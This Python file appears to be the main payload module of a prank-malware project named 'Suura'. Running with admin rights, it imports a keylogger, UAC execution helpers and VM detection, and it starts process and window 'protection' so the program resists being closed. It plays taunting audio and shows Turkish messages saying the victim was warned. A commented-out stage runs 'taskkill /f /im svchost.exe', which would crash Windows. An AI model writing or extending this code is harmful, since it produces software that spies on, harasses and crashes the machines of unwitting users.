import warnings
from Suura.includes.protect import ProcessProtection
from Suura.includes.protect import WindowProtection
from Suura.includes.key_logger import KeySniffer
from Suura.includes.util import AudioPlayer
from Suura import lib_path
from Suura import to_nt_path
from Suura.includes.util import is_admin,is_running_wmware
from Suura.includes.payloads.notepad_payload import TyperPayload
from Suura.includes.payloads.uac_payload import execute
from Suura.includes.msgbox import *

class SuuraMainPayload:
    def __init__(self):
        self.process_protect = ProcessProtection()
        self.window_protect = WindowProtection()
        self.audio_player = AudioPlayer(
            main_bg_wav=lib_path(to_nt_path("assets/audio/main_bg_old.wav")),
            surprise_motherfucker=lib_path(to_nt_path("assets/audio/suprise_motherfucker.wav"))
        )
        self.audio_player.main_bg_wav.loop = True
        self.notepad_payload = TyperPayload()
        self.notepad_payload.stage_edit_key(2,"on_close_function",self.end_stage_close_function)
    def end_stage_close_function(self):
        self.audio_player.main_bg_wav.stop()
        self.audio_player.surprise_motherfucker.play()
        """self.notepad_payload.stages = {
            "real_msg":"Sonu kötü olur demiştim!",
            "user_accept_msg":"",
            "user_not_accepted_msg":"",
            "user_accepted_msg":"",
            "on_close_function":execute("taskkill.exe /f /im svchost.exe")
        }
        """
        self.notepad_payload.close_all_notepad_windows()
        MessageBox(
            box = PreDialogs.DIA_OK_WITH_QUESTION_ICO,
            text = "Sonucu kötü olur demiştim brooo",
            title = "Adiooos"
        )
    def start(self):
        self.process_protect.start()
        self.window_protect.start()
        self.audio_player.main_bg_wav.play()
admin = is_admin()
if admin:
    s = SuuraMainPayload()
    s.start()
else:
    warnings.warn("Admin yetkilerine ihtiyacım var")